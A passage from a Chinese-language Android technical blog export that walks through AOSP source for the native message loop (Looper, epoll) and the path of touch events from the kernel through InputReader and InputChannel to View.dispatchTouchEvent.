现在我们看完了返回消息的全过程，其中只有一环没有解决了：nativePollOnce NativePollOnce()调用的是Native层android_os_MessageQueue.cpp下的函数： 12345static void android_os_MessageQueue_nativePollOnce(JNIEnv* env, jobject obj, jlong ptr, jint timeoutMillis) &#123; NativeMessageQueue* nativeMessageQueue = reinterpret_cast&lt;NativeMessageQueue*&gt;(ptr); nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis);&#125; 根据传入的地址，找到了之前新建的NativeMessageQueue对象，调用它的pollOnce()方法（注意参数中的timeoutMillis）： 12345678910111213void NativeMessageQueue::pollOnce(JNIEnv* env, jobject pollObj, int timeoutMillis) &#123; mPollEnv = env; mPollObj = pollObj; mLooper-&gt;pollOnce(timeoutMillis); mPollObj = NULL; mPollEnv = NULL; if (mExceptionObj) &#123; env-&gt;Throw(mExceptionObj); env-&gt;DeleteLocalRef(mExceptionObj); mExceptionObj = NULL; &#125;&#125; 其实调用的是保存的NativeLooper的pollOnce()方法（注意参数中的timeoutMillis）。 现在我将NativeLooper中关于Native事件循环的代码全部忽略，只分析与前面这个过程有关的部分： 12345int Looper::pollOnce(int timeoutMillis, int* outFd, int* outEvents, void** outData) &#123;... result = pollInner(timeoutMillis); &#125;&#125; 调用了pollInner()方法（注意参数中的timeoutMillis），分为两部分分析： 12345678910111213141516171819202122232425262728293031323334353637383940int Looper::pollInner(int timeoutMillis) &#123;... mPolling = true; struct epoll_event eventItems[EPOLL_MAX_EVENTS]; int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis); mPolling = false;... // 检查轮询错误 if (eventCount &lt; 0) &#123; if (errno == EINTR) &#123; goto Done; &#125; ALOGW(\"Poll failed with an unexpected error: %s\", strerror(errno)); result = POLL_ERROR; goto Done; &#125; // 检查轮询超时 if (eventCount == 0) &#123;#if DEBUG_POLL_AND_WAKE ALOGD(\"%p ~ pollOnce - timeout\", this);#endif result = POLL_TIMEOUT; goto Done; &#125; // 处理事件 for (int i = 0; i &lt; eventCount; i++) &#123; int fd = eventItems[i].data.fd; uint32_t epollEvents = eventItems[i].events; if (fd == mWakeEventFd) &#123; if (epollEvents &amp; EPOLLIN) &#123; awoken(); &#125; else &#123; ALOGW(\"Ignoring unexpected epoll events 0x%x on wake event fd.\", epollEvents); &#125; &#125; else &#123; ... &#125; &#125; 第6行就是事情的关键，我们执行了系统epoll_wait()调用（对我们之前创建的mEpollFd epoll实例），这是一个阻塞调用，当注册的Fd有新内容或者到达超时时间时才会返回。我们还记得前面我们创建了mWakeEventFd和eventItem并把它注册到了mEpollFd中。这样，只要mWakeEventFd中有了新的内容，这行调用就会返回，解除阻塞。 现在我们可以推测，当有新消息到来时，正是以向mWakeEvendFd中写入内容的方式来使nativePollOnce()调用返回，达到了通知消息循环继续处理的目的。 如果没有新的消息呢？我们一步步传进来的timeoutMillis就作为了epoll_wait()的超时参数，一旦到达这个时间，epoll_wait()函数就会返回，这达到了我们等待一段时间再去执行下一条消息的目的。 如果超时，20行检测出超时，跳转到Done。 如果因fd触发而返回，会进入28行的事件处理过程，这个过程依据拿到的eventItem对象，检查fd与events标志，如果是我们之前设置的用于唤醒的mWakeEventFd，调用awaken()： 1234void Looper::awoken() &#123; uint64_t counter; TEMP_FAILURE_RETRY(read(mWakeEventFd, &amp;counter, sizeof(uint64_t)));&#125; 做的事情非常简单，通过read()读取并清零fd中的数据。 你可能会想，为什么什么事情都没有做呢？因为这个mWakeEventFd存在的唯一目的就是解除阻塞，现在这个目的已经达到了，我们只要重置它以便下一次使用就可以了。 Done标号以后的代码与我们的过程无关，执行了自定义fd消息处理相关的内容。最后将result返回： 1return result; 现在我们可以重新看待nativePollOnce()函数，再次强调，它的作用是阻塞，当有新的消息或达到超时后返回。而这个核心的特性，完全是利用系统提供的epoll机制实现的。 现在整个Java消息循环的处理过程已经看完了，下面我们来结合常用的Handler来讲解向消息队列中投入新的消息的过程。 Android 消息机制（二）Handler对消息机制的使用","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"Event","slug":"Event","permalink":"https://www.viseator.com/tags/Event/"}]},{"title":"Android 触摸事件分发机制（二）原始事件消息传递与分发的开始","date":"2017-10-07T05:00:00.000Z","path":"2017/10/07/android_view_event_2/","text":"回顾在上一篇文章中，我们探索了从内核触摸事件传递到InputDispatcher线程，再与应用线程之间建立InputChannel的过程，并且我们已经看到一个最原始的触摸事件被封装成一个msg并通过InputChannel建立的socket通过sendMessage()方法跨线程通信发送给了应用的UI线程。 这篇文章将会看到应用UI线程的消息队列是如何读取传递过来的触摸事件并进行处理、分发的。 本篇文章主要参考了Gityuan的文章 消息循环Android的消息机制的具体内容在只简单描述，详细内容请见： http://www.viseator.com/2017/10/22/android_event_1/ 应用的UI线程拥有消息队列与一个Looper，应用初始化的过程中会调用Looper的loop()方法来启动一个无限循环来不断读取、处理队列中的消息，Android是一个事件驱动的模型，只有源源不断的事件产生与处理才能推动应用的进行。 同时应该注意的是在Java与Native中各有一套消息处理的流程可以进行消息的处理，而如同触摸事件这种来源于Native层的事件消息，都是通过Native Looper进行处理的。 Looper当应用初始化时，会调用Looper.prepare()： 123456private static void prepare(boolean quitAllowed) &#123; if (sThreadLocal.get() != null) &#123; throw new RuntimeException(\"Only one Looper may be created per thread\"); &#125; sThreadLocal.set(new Looper(quitAllowed));&#125; 会在ThreadLocal区域新建一个Looper对象： 1234private Looper(boolean quitAllowed) &#123; mQueue = new MessageQueue(quitAllowed); mThread = Thread.currentThread();&#125; 同时初始化了一个MessageQueue，保存了当前的线程： 1234MessageQueue(boolean quitAllowed) &#123; mQuitAllowed = quitAllowed; mPtr = nativeInit();&#125; nativeInit()方法初始化了native的消息队列： 12345678910static jlong android_os_MessageQueue_nativeInit(JNIEnv* env, jclass clazz) &#123; NativeMessageQueue* nativeMessageQueue = new NativeMessageQueue(); if (!nativeMessageQueue) &#123; jniThrowRuntimeException(env, \"Unable to allocate native queue\"); return 0; &#125; nativeMessageQueue-&gt;incStrong(env); return reinterpret_cast&lt;jlong&gt;(nativeMessageQueue);&#125; 新建了一个NativeMessageQueue： 12345678NativeMessageQueue::NativeMessageQueue() : mPollEnv(NULL), mPollObj(NULL), mExceptionObj(NULL) &#123; mLooper = Looper::getForThread(); if (mLooper == NULL) &#123; mLooper = new Looper(false); Looper::setForThread(mLooper); &#125;&#125; 这里进行的初始化过程与java层的比较类似，都是新建了一个Looper对象存放入了ThreadLocal区域中。 当初始化过程完成之后，系统调用Looper.loop()开始消息循环： 12345678910111213141516171819202122232425public static void loop() &#123; final Looper me = myLooper(); ... final MessageQueue queue = me.mQueue; ... for (;;) &#123; Message msg = queue.next(); // might block if (msg == null) &#123; // No message indicates that the message queue is quitting. return; &#125; ... try &#123; msg.target.dispatchMessage(msg); &#125; finally &#123; if (traceTag != 0) &#123; Trace.traceEnd(traceTag); &#125; &#125; ... msg.recycleUnchecked(); &#125;&#125; 省略了大量代码，我们看到在这个无限循环中，首先就调用了MessageQueue的next()方法来获取下一条消息，注意这是一个阻塞调用，在下一条消息还没到时间或者没有下一条消息时候会被阻塞。 1234567891011121314151617181920Message next() &#123; // Return here if the message loop has already quit and been disposed. // This can happen if the application tries to restart a looper after quit // which is not supported. final long ptr = mPtr; if (ptr == 0) &#123; return null; &#125; int pendingIdleHandlerCount = -1; // -1 only during first iteration int nextPollTimeoutMillis = 0; for (;;) &#123; if (nextPollTimeoutMillis != 0) &#123; Binder.flushPendingCommands(); &#125; nativePollOnce(ptr, nextPollTimeoutMillis); ... &#125;&#125; 这里我们不关心java层后续对事件的处理，而是关心java层是如何调用native层的方法来对native消息队列中的事件进行处理的，因为我们的触摸事件是在native层进行处理再到java层进行分发的。 在next()方法中我们就调用了nativePollOnce()方法先去处理native中的事件： 12345static void android_os_MessageQueue_nativePollOnce(JNIEnv* env, jobject obj, jlong ptr, jint timeoutMillis) &#123; NativeMessageQueue* nativeMessageQueue = reinterpret_cast&lt;NativeMessageQueue*&gt;(ptr); nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis);&#125; 调用了nativeMessageQueue的pollOnce()方法： 12345678910111213void NativeMessageQueue::pollOnce(JNIEnv* env, jobject pollObj, int timeoutMillis) &#123; mPollEnv = env; mPollObj = pollObj; mLooper-&gt;pollOnce(timeoutMillis); mPollObj = NULL; mPollEnv = NULL; if (mExceptionObj) &#123; env-&gt;Throw(mExceptionObj); env-&gt;DeleteLocalRef(mExceptionObj); mExceptionObj = NULL; &#125;&#125; 调用了native Looper的pollOnce()方法： 1234567int Looper::pollOnce(int timeoutMillis, int* outFd, int* outEvents, void** outData) &#123; int result = 0; for (;;) &#123; ... result = pollInner(timeoutMillis); &#125;&#125; 忽略特殊处理的过程，最终调用了pollInner()方法：（PollInner()的代码比较长，省略了大部分，标记了后面讨论的三个部分） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566int Looper::pollInner(int timeoutMillis) &#123; ...// 省略初始化过程 // Poll. int result = POLL_WAKE; mResponses.clear(); mResponseIndex = 0; // We are about to idle. mPolling = true; /*-------1-------*/ struct epoll_event eventItems[EPOLL_MAX_EVENTS]; int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis); ... /*---------------*/ /*-------2-------*/ for (int i = 0; i &lt; eventCount; i++) &#123; int fd = eventItems[i].data.fd; uint32_t epollEvents = eventItems[i].events; if (fd == mWakeEventFd) &#123; if (epollEvents &amp; EPOLLIN) &#123; awoken(); &#125; else &#123; ALOGW(\"Ignoring unexpected epoll events 0x%x on wake event fd.\", epollEvents); &#125; &#125; else &#123; ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &gt;= 0) &#123; int events = 0; if (epollEvents &amp; EPOLLIN) events |= EVENT_INPUT; if (epollEvents &amp; EPOLLOUT) events |= EVENT_OUTPUT; if (epollEvents &amp; EPOLLERR) events |= EVENT_ERROR; if (epollEvents &amp; EPOLLHUP) events |= EVENT_HANGUP; pushResponse(events, mRequests.valueAt(requestIndex)); &#125; else &#123; ALOGW(\"Ignoring unexpected epoll events 0x%x on fd %d that is \" \"no longer registered.\", epollEvents, fd); &#125; &#125; &#125;Done: ; ...// 省略native message处理过程 // Release lock. mLock.unlock(); /*---------------*/ /*-------3-------*/ for (size_t i = 0; i &lt; mResponses.size(); i++) &#123; Response&amp; response = mResponses.editItemAt(i); if (response.request.ident == POLL_CALLBACK) &#123; int fd = response.request.fd; int events = response.events; void* data = response.request.data; int callbackResult = response.request.callback-&gt;handleEvent(fd, events, data); if (callbackResult == 0) &#123; removeFd(fd, response.request.seq); &#125; response.request.callback.clear(); result = POLL_CALLBACK; &#125; &#125; /*---------------*/ return result;&#125; 第一部分中，调用了epoll_wait()函数等待消息，当接收到消息或者发生超时的时候调用返回。 第二部分对返回的events进行遍历，如果对应的fd为唤醒专用的mWakeEventFd，执行awoken()函数清空管道，这个事件的作用只是为了唤醒Looper对新消息进行处理。 如果不是mWakeEventFd，说明为我们之前通过addFd()函数添加的自定义fd，我们需要对这个event进行处理，处理函数为pushResponse()： 12ssize_t requestIndex = mRequests.indexOfKey(fd);pushResponse(events, mRequests.valueAt(requestIndex)); 我们还记得在前面addFd()的过程中已经将fd作为索引，向mRequest中保存了request信息，信息中包含了callback也就是NativeInputEventReceiver对象。 123456void Looper::pushResponse(int events, const Request&amp; request) &#123; Response response; response.events = events; response.request = request; mResponses.push(response);&#125; 这里将request对象包装成了一个response，然后存入了mResponses中等待后面的处理。 第三部分中就是对于response的处理过程，主要就是这个调用： 1int callbackResult = response.request.callback-&gt;handleEvent(fd, events, data); 调用了callback的handleEvent()，我们现在知道callback是前面保存的NativeInputEventReceiver对象。 现在，当原始事件通过建立好的InputChannel的sendMessage()函数发送触摸事件时： 123456789status_t InputChannel::sendMessage(const InputMessage* msg) &#123; size_t msgLength = msg-&gt;size(); ssize_t nWrite; do &#123; nWrite = ::send(mFd, msg, msgLength, MSG_DONTWAIT | MSG_NOSIGNAL); &#125; while (nWrite == -1 &amp;&amp; errno == EINTR); ... return OK;&#125; 会直接调用send()函数向fd表示的socket中写入数据，同时在另一边的epoll_wait()调用就会因socket另一端fd数据的到来而唤醒，并通过fd找到注册好的request，进而调用request中的NativeInputEventReceiver的handleEvent()方法，参数就是我们接收到的事件信息与数据。 handleEvent1234567891011int NativeInputEventReceiver::handleEvent(int receiveFd, int events, void* data) &#123; ... if (events &amp; ALOOPER_EVENT_INPUT) &#123; JNIEnv* env = AndroidRuntime::getJNIEnv(); status_t status = consumeEvents(env, false /*consumeBatches*/, -1, NULL); mMessageQueue-&gt;raiseAndClearException(env, \"handleReceiveCallback\"); return status == OK || status == NO_MEMORY ? 1 : 0; &#125; ... return 1;&#125; 调用了consumeEvents()函数来处理事件，函数较长，我们拆开来看： 函数进行初始化过程之后执行了一个无限循环，循环体中的内容如下： 123InputEvent* inputEvent; status_t status = mInputConsumer.consume(&amp;mInputEventFactory, consumeBatches, frameTime, &amp;seq, &amp;inputEvent); 首先就调用了mInputConsumer对象的consume方法接收并将原始的事件转换为分发过程中标准的MotionEvent： 1status_t result = mChannel-&gt;receiveMessage(&amp;mMsg); 这里就直接调用了InputChannel的receiveMessage()函数来接收另一端发送来的消息。 1234567status_t InputChannel::receiveMessage(InputMessage* msg) &#123; ssize_t nRead; do &#123; nRead = ::recv(mFd, msg, sizeof(InputMessage), MSG_DONTWAIT); &#125; while (nRead == -1 &amp;&amp; errno == EINTR); ...&#125; 从socket另一端的fd中读取发送过来的触摸事件消息并存放在了mMsg中，之后进行处理： 12345678910111213141516171819202122 switch (mMsg.header.type) &#123; case InputMessage::TYPE_KEY: &#123; ... &#125; case AINPUT_EVENT_TYPE_MOTION: &#123; ... MotionEvent* motionEvent = factory-&gt;createMotionEvent(); if (! motionEvent) return NO_MEMORY; updateTouchState(&amp;mMsg); initializeMotionEvent(motionEvent, &amp;mMsg); *outSeq = mMsg.body.motion.seq; *outEvent = motionEvent;#if DEBUG_TRANSPORT_ACTIONS ALOGD(\"channel '%s' consumer ~ consumed motion event, seq=%u\", mChannel-&gt;getName().string(), *outSeq);#endif break; &#125; &#125; 这里对事件的类型进行了一个判断，当类型为MOTION即触摸事件时，新建了一个MotionEvent，然后用mMsg去进行初始化： 12345678910111213141516171819202122232425262728void InputConsumer::initializeMotionEvent(MotionEvent* event, const InputMessage* msg) &#123; uint32_t pointerCount = msg-&gt;body.motion.pointerCount; PointerProperties pointerProperties[pointerCount]; PointerCoords pointerCoords[pointerCount]; for (uint32_t i = 0; i &lt; pointerCount; i++) &#123; pointerProperties[i].copyFrom(msg-&gt;body.motion.pointers[i].properties); pointerCoords[i].copyFrom(msg-&gt;body.motion.pointers[i].coords); &#125; event-&gt;initialize( msg-&gt;body.motion.deviceId, msg-&gt;body.motion.source, msg-&gt;body.motion.action, msg-&gt;body.motion.actionButton, msg-&gt;body.motion.flags, msg-&gt;body.motion.edgeFlags, msg-&gt;body.motion.metaState, msg-&gt;body.motion.buttonState, msg-&gt;body.motion.xOffset, msg-&gt;body.motion.yOffset, msg-&gt;body.motion.xPrecision, msg-&gt;body.motion.yPrecision, msg-&gt;body.motion.downTime, msg-&gt;body.motion.eventTime, pointerCount, pointerProperties, pointerCoords);&#125; 然后在第14行把它存入了outEvent（也就是consume()函数中传入的inputEvent）中，现在函数返回到NativeInputEventReceiver::consumeEvents()继续处理： 1234567891011121314151617181920212223242526switch (inputEvent-&gt;getType()) &#123; case AINPUT_EVENT_TYPE_KEY: ... case AINPUT_EVENT_TYPE_MOTION: &#123; if (kDebugDispatchCycle) &#123; ALOGD(\"channel '%s' ~ Received motion event.\", getInputChannelName()); &#125; MotionEvent* motionEvent = static_cast&lt;MotionEvent*&gt;(inputEvent); if ((motionEvent-&gt;getAction() &amp; AMOTION_EVENT_ACTION_MOVE) &amp;&amp; outConsumedBatch) &#123; *outConsumedBatch = true; &#125; inputEventObj = android_view_MotionEvent_obtainAsCopy(env, motionEvent); break; &#125; ... &#125; if (inputEventObj) &#123; if (kDebugDispatchCycle) &#123; ALOGD(\"channel '%s' ~ Dispatching input event.\", getInputChannelName()); &#125; env-&gt;CallVoidMethod(receiverObj.get(), gInputEventReceiverClassInfo.dispatchInputEvent, seq, inputEventObj); ... &#125; 下面就对inputEvent（即为MotionEvent）的类型作了一个判断，对inputEventObj（用于调用java层方法）进行赋值。随后就通过JNI 的CallVoidMethod()方法来调用java层的dispatchInputEvent()方法。这里调用的是java层InputEventReceiver的dispatchInputEvent()方法： 从这里，我们从Native层跨越到了java层。 开始分发dispatchInputEvent1234private void dispatchInputEvent(int seq, InputEvent event) &#123; mSeqMap.put(event.getSequenceNumber(), seq); onInputEvent(event);&#125; InputEventReceiver是一个抽象类，具体实现类是ViewRootImpl的内部类WindowInputEventReceiver，它覆盖了onInputEvent()方法： 1234@Overridepublic void onInputEvent(InputEvent event) &#123; enqueueInputEvent(event, this, 0, true);&#125; 调用了ViewRootImpl的enqueueInputEvent()方法： 12345678910111213141516171819202122232425262728void enqueueInputEvent(InputEvent event, InputEventReceiver receiver, int flags, boolean processImmediately) &#123; adjustInputEventForCompatibility(event); QueuedInputEvent q = obtainQueuedInputEvent(event, receiver, flags); // Always enqueue the input event in order, regardless of its time stamp. // We do this because the application or the IME may inject key events // in response to touch events and we want to ensure that the injected keys // are processed in the order they were received and we cannot trust that // the time stamp of injected events are monotonic. QueuedInputEvent last = mPendingInputEventTail; if (last == null) &#123; mPendingInputEventHead = q; mPendingInputEventTail = q; &#125; else &#123; last.mNext = q; mPendingInputEventTail = q; &#125; mPendingInputEventCount += 1; Trace.traceCounter(Trace.TRACE_TAG_INPUT, mPendingInputEventQueueLengthCounterName, mPendingInputEventCount); if (processImmediately) &#123; doProcessInputEvents(); &#125; else &#123; scheduleProcessInputEvents(); &#125;&#125; 将接收到的事件加入了mPendingInutEvent链表的头部，注释里给出了这么做的原因：当发生事件插入的时候我们不能依赖事件的时间戳是准确的，因此必须让最新收到的事件先进行处理。 最终调用doProcessInputEvents()进行事件处理： 12345678910111213141516171819202122232425262728void doProcessInputEvents() &#123; // Deliver all pending input events in the queue. while (mPendingInputEventHead != null) &#123; QueuedInputEvent q = mPendingInputEventHead; mPendingInputEventHead = q.mNext; if (mPendingInputEventHead == null) &#123; mPendingInputEventTail = null; &#125; q.mNext = null; mPendingInputEventCount -= 1; Trace.traceCounter(Trace.TRACE_TAG_INPUT, mPendingInputEventQueueLengthCounterName, mPendingInputEventCount); long eventTime = q.mEvent.getEventTimeNano(); long oldestEventTime = eventTime; if (q.mEvent instanceof MotionEvent) &#123; MotionEvent me = (MotionEvent)q.mEvent; if (me.getHistorySize() &gt; 0) &#123; oldestEventTime = me.getHistoricalEventTimeNano(0); &#125; &#125; mChoreographer.mFrameInfo.updateInputEventTime(eventTime, oldestEventTime); deliverInputEvent(q); &#125; ...&#125; 在从链表中取出事件之后，对事件的时间戳进行了更新。然后调用deliverInputEvent()方法： 12345678910111213141516171819private void deliverInputEvent(QueuedInputEvent q) &#123; Trace.asyncTraceBegin(Trace.TRACE_TAG_VIEW, \"deliverInputEvent\", q.mEvent.getSequenceNumber()); if (mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onInputEvent(q.mEvent, 0); &#125; InputStage stage; if (q.shouldSendToSynthesizer()) &#123; stage = mSyntheticInputStage; &#125; else &#123; stage = q.shouldSkipIme() ? mFirstPostImeInputStage : mFirstInputStage; &#125; if (stage != null) &#123; stage.deliver(q); &#125; else &#123; finishInputEvent(q); &#125;&#125; 这段代码第一眼看上去比较难懂，Stage让我们联想到了CPU流水线处理过程中的Stage，这里就是进入了一个流水线过程来处理事件： 流水线事件处理 首先看到我们可以根据事件类型的需要从mSyntheticInputStage EarlyPostImeInputStage NativePreImeInputStage三个入口进入流水线，而流水线的每一步都对事件进行了不同的处理，并可以通过forward()方法传递到下一个Stage进行处理。并且这里使用的流水线是一个异步流水线，可以允许多个事件同时在里面运行处理，这种架构使得事件处理流程效率非常高。 那么我们的触摸事件从NativePreImeInputStage进入流水线后会经历什么处理过程呢： 我们并不是IME的事件，所以直接从EarlyPostImeInputStage开始： EarlyPostImeInputStage123456789101112@Overrideprotected int onProcess(QueuedInputEvent q) &#123; if (q.mEvent instanceof KeyEvent) &#123; return processKeyEvent(q); &#125; else &#123; final int source = q.mEvent.getSource(); if ((source &amp; InputDevice.SOURCE_CLASS_POINTER) != 0) &#123; return processPointerEvent(q); &#125; &#125; return FORWARD;&#125; 第7行判断成立，进入processPointerEvent()： 123456789101112131415161718192021222324252627private int processPointerEvent(QueuedInputEvent q) &#123; final MotionEvent event = (MotionEvent)q.mEvent; // Translate the pointer event for compatibility, if needed. if (mTranslator != null) &#123; mTranslator.translateEventInScreenToAppWindow(event); &#125; // Enter touch mode on down or scroll. final int action = event.getAction(); if (action == MotionEvent.ACTION_DOWN || action == MotionEvent.ACTION_SCROLL) &#123; ensureTouchMode(true); &#125; // Offset the scroll position. if (mCurScrollY != 0) &#123; event.offsetLocation(0, mCurScrollY); &#125; // Remember the touch position for possible drag-initiation. if (event.isTouchEvent()) &#123; mLastTouchPoint.x = event.getRawX(); mLastTouchPoint.y = event.getRawY(); mLastTouchSource = event.getSource(); &#125; return FORWARD;&#125; 对事件进行处理以后继续进入下一阶段。 NativePostImeInputStage12345678@Overrideprotected int onProcess(QueuedInputEvent q) &#123; if (mInputQueue != null) &#123; mInputQueue.sendInputEvent(q.mEvent, q, false, this); return DEFER; &#125; return FORWARD;&#125; 如果有事件等待被处理，则推迟当前事件的处理（实现异步）。否则直接进入下一个阶段： ViewPostImeInputStage123456789101112131415@Overrideprotected int onProcess(QueuedInputEvent q) &#123; if (q.mEvent instanceof KeyEvent) &#123; return processKeyEvent(q); &#125; else &#123; final int source = q.mEvent.getSource(); if ((source &amp; InputDevice.SOURCE_CLASS_POINTER) != 0) &#123; return processPointerEvent(q); &#125; else if ((source &amp; InputDevice.SOURCE_CLASS_TRACKBALL) != 0) &#123; return processTrackballEvent(q); &#125; else &#123; return processGenericMotionEvent(q); &#125; &#125;&#125; 第7行判断成立，调用processPointerEvent()方法： 123456789101112private int processPointerEvent(QueuedInputEvent q) &#123; final MotionEvent event = (MotionEvent)q.mEvent; mAttachInfo.mUnbufferedDispatchRequested = false; final View eventTarget = (event.isFromSource(InputDevice.SOURCE_MOUSE) &amp;&amp; mCapturingView != null) ? mCapturingView : mView; mAttachInfo.mHandlingPointerEvent = true; boolean handled = eventTarget.dispatchPointerEvent(event); ... return handled ? FINISH_HANDLED : FORWARD;&#125; 判断目标是否是mCapturingView，一般情况下目标就是mView（也就是当前Window的根View也就是DecorView），然后调用了它的dispatchPointerEvent()方法（继承自View）： 1234567public final boolean dispatchPointerEvent(MotionEvent event) &#123; if (event.isTouchEvent()) &#123; return dispatchTouchEvent(event); &#125; else &#123; return dispatchGenericMotionEvent(event); &#125;&#125; 到这里，我们终于看到了熟悉的dispatchTouchEvent()方法，同时这也是一般触摸事件分发机制分析的开始。 小结现在，我们了解了从原始事件的产生地点到某个应用UI线程事件循环再到根view的dispatchTouchEvent()的整个流程。分析这个过程还是要再次感谢Gityuan的博客，这个过程找得到的资料只有他的文章，省了许多功夫。 下一篇文章开始就要讲解一般触摸事件分发分析的过程，也是参考资料比较多的部分。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"https://www.viseator.com/tags/View/"}]},{"title":"Android 触摸事件分发机制（一）从内核到应用 一切的开始","date":"2017-09-14T03:20:38.000Z","path":"2017/09/14/android_view_event_1/","text":"写在前面本文基于Android 7.1.1 (API 25)的源码分析编写 安卓是基于触摸操作进行交互的系统，几乎所有的操作都由对屏幕的一次次触摸完成，如何正确处理触摸事件关乎整个应用的操作体验。因此安卓对于触摸事件的分发与处理机制也是我们学习安卓开发的重中之重。同时几乎每一个安卓技术博客中都会对触摸分发机制这一块进行详解，例如比较早期也是最为出名的郭霖（《第一行代码》的作者）。现在网络上对于这一块的分析也已经比较详尽了，基本上一篇博客中遗漏的部分都可以在其他博客中找到答案。 但是无论别人的文章讲得多好，多么详细，我们都需要自己去打开源码仔细分析好好体会，一是这样一个比较复杂的过程不经历自己的思考很难完全理解，二是随着api版本的推进这部分源码也会发生很多变化，虽然大致思路相同，但是接触到新的内容总是一件好事。 这也就是我写这篇博文的原因：记录自己思考与分析的过程。 触摸事件的来源这部分的内容与安卓本身无关，代码大部分也都是C++实现的，中间的大部分内容来自于我对相关资料的总结，不在代码层面进行详细解释，只是说明一个流程，同时也会对代码进行大部分的删减，只关注最核心的那部分。 从硬件到内核我们从头开始，从触摸事件最初最初的来源开始，我们知道内核是以处理中断的方式处理用户的输入的，触摸事件作为一种特殊的输入事件，自然也需要这种方式进行处理，只不过触摸事件的提供的信息要稍微复杂一些。 触摸事件来自于我们对硬件的操作，最初的来源当然是硬件引起的中断。而处理特定中断的代码则来自于对应硬件的驱动： 图片来源（以下系列图片来源相同，不作标注） 当一个输入设备的驱动模块被首次载入内核的时候，会检测它应该管理的硬件设备，如果检测成功，驱动模块会调用include/linux/input.h中的input_register_device(…)函数设置一个/dev/input/eventX（X为整数）来代表这个输入设备。驱动模块同时也会通过include/linux/interrupt.h的request_irq(…)函数注册一个函数去处理这个硬件引发的中断，注册成功以后，当设备因用户交互而产生中断的时候就会交给对应的驱动模块进行处理。 驱动模块处理的细节各不相同，但最终都会将数据处理后存放进对应的/dev/input/eventX文件中。 系统对触摸事件的处理现在驱动程序为我们收集好了原始的输入信息并存放在了eventX文件中，下一步就是系统对于这个文件的处理并发送到应用层面。 可以看到系统服务充当了从内核到应用的桥梁。 系统服务由三个组件构成：EventHub、InputReader、InputDispatcher，关于它们的作用的详细分析在： http://gityuan.com/2016/12/31/input-ipc/ 下面对这个过程作简单介绍。 EventHub文件在frameworks/native/services/inputflinger/EventHub.cpp 它的作用是监听、读取/dev/input目录下产生的新事件，并封装成RawEvent结构体供InputReader使用。 InputReader文件在frameworks/native/services/inputflinger/InputReader.cpp InputReader运行在一个单独的进程中，这个进程由InputManagerService的初始化而新建，具体内容请见： http://gityuan.com/2016/12/10/input-manager/ 它会在内部不断地循环调用loopOnce()方法来不断读取事件： 123456789void InputReader::loopOnce() &#123; ... size_t count = mEventHub-&gt;getEvents(timeoutMillis, mEventBuffer, EVENT_BUFFER_SIZE); ... if (count) &#123; processEventsLocked(mEventBuffer, count); &#125; ...&#125; 第3行调用了mEventHub的getEvent()方法以获取事件。 第6行调用processEventLocked()方法来处理事件，经过一系列判断之后，会执行这行代码： 1device-&gt;process(rawEvents, count); process函数会执行如下代码： 12InputMapper* mapper = mMappers[i];mapper-&gt;process(rawEvent); 使用mapper去处理rawEvent，不同的输入事件类型会由不同的mapper去处理，以处理触摸事件的TouchInputMapper为例： 只看核心调用的话，会依次调用如下函数： 1234567891011void TouchInputMapper::process(const RawEvent* rawEvent)void TouchInputMapper::sync(nsecs_t when)void TouchInputMapper::processRawTouches(bool timeout)void TouchInputMapper::cookAndDispatch(nsecs_t when)void TouchInputMapper::dispatchTouches(nsecs_t when, uint32_t policyFlags) void TouchInputMapper::dispatchMotion(nsecs_t when, uint32_t policyFlags, uint32_t source, int32_t action, int32_t actionButton, int32_t flags, int32_t metaState, int32_t buttonState, int32_t edgeFlags, const PointerProperties* properties, const PointerCoords* coords, const uint32_t* idToIndex, BitSet32 idBits, int32_t changedId, float xPrecision, float yPrecision, nsecs_t downTime) 在最终的dispatchMotion()函数中执行以下代码： 12345NotifyMotionArgs args(when, getDeviceId(), source, policyFlags, action, actionButton, flags, metaState, buttonState, edgeFlags, mViewport.displayId, pointerCount, pointerProperties, pointerCoords, xPrecision, yPrecision, downTime);getListener()-&gt;notifyMotion(&amp;args); 可以看到事件已经被处理成了一个args，然后调用getListener()： 123InputListenerInterface* InputReader::ContextImpl::getListener() &#123; return mReader-&gt;mQueuedListener.get();&#125; 获取的是mQueuedListener，查看notifyMotion()函数： 123void QueuedInputListener::notifyMotion(const NotifyMotionArgs* args) &#123; mArgsQueue.push(new NotifyMotionArgs(*args));&#125; 这里的NotifyMotionArgs()只是对事件进行了一次再封装。可以看到这个args最终进入了QueuedInputListener的mArgsQueue中。 我们再回到InputReader的loopOnce()函数中，函数在执行完上述调用到达最后一行时： 1mQueuedListener-&gt;flush(); 调用flush()函数： 123456789void QueuedInputListener::flush() &#123; size_t count = mArgsQueue.size(); for (size_t i = 0; i &lt; count; i++) &#123; NotifyArgs* args = mArgsQueue[i]; args-&gt;notify(mInnerListener); delete args; &#125; mArgsQueue.clear();&#125; 调用了各args的notify()函数： 123void NotifyMotionArgs::notify(const sp&lt;InputListenerInterface&gt;&amp; listener) const &#123; listener-&gt;notifyMotion(this);&#125; 注意这里的listener传入的是mInnerListener，它是什么呢？ 123QueuedInputListener::QueuedInputListener(const sp&lt;InputListenerInterface&gt;&amp; innerListener) : mInnerListener(innerListener) &#123;&#125; 在构造函数中初始化。 12345678910111213141516InputReader::InputReader(const sp&lt;EventHubInterface&gt;&amp; eventHub, const sp&lt;InputReaderPolicyInterface&gt;&amp; policy, const sp&lt;InputListenerInterface&gt;&amp; listener) : mContext(this), mEventHub(eventHub), mPolicy(policy), mGlobalMetaState(0), mGeneration(1), mDisableVirtualKeysTimeout(LLONG_MIN), mNextTimeout(LLONG_MAX), mConfigurationChangesToRefresh(0) &#123; mQueuedListener = new QueuedInputListener(listener); &#123; // acquire lock AutoMutex _l(mLock); refreshConfigurationLocked(0); updateGlobalMetaStateLocked(); &#125; // release lock&#125; 在InputReader构造函数中构造QueuedInputListener。 而InputReader是由InputManager类进行初始化的（线程的新建也在这个类中）： 12345678InputManager::InputManager( const 